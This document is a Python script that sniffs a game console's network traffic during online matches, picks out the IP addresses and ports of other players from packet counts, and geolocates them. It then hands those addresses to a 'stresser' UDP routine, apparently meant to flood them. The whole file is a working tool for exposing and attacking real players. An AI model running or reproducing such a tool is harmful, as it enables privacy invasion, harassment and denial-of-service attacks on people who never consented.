import pyshark
import netCore
import config
import stresser


# Simplify common function names.
log = netCore.log
compIP = netCore.compIP

# Start tshark process in file or live capture mode depending on config file.
if config.useFile:
    log("[+] Using file for packet capture")
    cap = pyshark.FileCapture(config.fileName)
    log("[•] Loading file into memory, this might take a while...")
    cap.load_packets()
    log("[•] Imported (P)CAP file!")
else:
    log('[+] Starting capture interface...')
    capture = pyshark.LiveCapture(interface=config.interfaceName)
    PacketRecieved = capture.apply_on_packets

# Get user input for number of players in match.
if config.autoDetectPlayers == False:
    try:
        playersInMatch = int(input("[?] How many players are in the match: "))
    except ValueError:
        print("[-] Invalid input, defaulting to 8!")
        playersInMatch = 8
else:
    print("[•] Attempting to auto-detect number of players...")
    playersInMatch = 0

# Check if the user is spectating or in-game.
try:
    spec = input("[?] Are you spectating (Y/N): ")
    if spec.lower() == 'y':
        spec = True
    else:
        spec = False
except ValueError:
    print("[-] Invalid input, defaulting to No!")
    spec = False

# Set up variables that are used by multiple functions.
finished = False
ipList = {}
canidateList = []

# This function is called after an IP has hit the packet threshold defined by the config file.
def captureFinished():
    print("[+] Located players!")
    print("[•] Attempting to GeoLocate...")
    netCore.printPlayers(canidateList)
    stresser.udpKnock(canidateList)

def isPlayer(ip):
    test = ipList[ip]
    compVal = (test/config.packetThreshold)*100

    if compVal >= 60:
        return 1
    else:
        return 0


# Sorts the IP entity list by times accessed and adds the top canidates to a list.
def findUsers():
    x = 0
    global finished
    global playersInMatch
    sortedList = dict(sorted(ipList.items(), key=lambda item: item[1], reverse=True))
    sortedList = list(sortedList.keys())

    if config.autoDetectPlayers:
        for x in range(0, len(sortedList)):
            playersInMatch += isPlayer(sortedList[x])
        
    while x < playersInMatch-1 and x < len(sortedList):
        canidateList.append(sortedList[x])
        x += 1
    finished = True

# Main function that gets called every time a packet is recieved.
# Handles reading all packets sent and creating a dictionary with all IPs and their times accessed.
def feedbackLoop(packet):
    # Checks to ensure the packet is an accepted type, returns if not.
    if packet.highest_layer in config.acceptedProtocols:
        try:
            senderIP = packet.ip.src
        except Exception:
            return

        # Checks if the player is spectating. If they are, it will read recieved packets instead of sent ones.
        if not spec:
            if senderIP != config.switchIP:
                return
        
        # Attempts to gather the destination address and port. If it fails, it will return.
        try:
            dstAddr = packet.ip.dst
            dstPort = packet[packet.transport_layer].dstport
        except AttributeError:
            return

        # Compresses address and port into a single value to be added to the dictionary.
        compress = compIP(dstAddr, dstPort)
        
        # Checks if the IP is already in the dictionary. If it is, it will increment the times accessed.
        # Otherwise, it will add it to the dictionary.
        if compress not in ipList:
            ipList[compress] = 1
            log('[•] Located new entity at {}'.format(compress))
        else:
            if ipList[compress] >= config.packetThreshold:
                log("[+] Packet threshold reached! ({} with {} packets)".format(compress, ipList[compress]))
                findUsers()
                captureFinished()
            ipList[compress] += 1

# Checks if the user is running in File or Live Capture mode.
# If in Live Capture mode, it will call the feedbackLoop function every time a packet is recieved.
# If in File mode, it will iterate through a (p)cap file and call the feedbackLoop function for each packet.
if config.useFile:
    for x in range(0, len(cap)):
        if finished:
            break
        feedbackLoop(cap[x])
else:
    PacketRecieved(feedbackLoop)

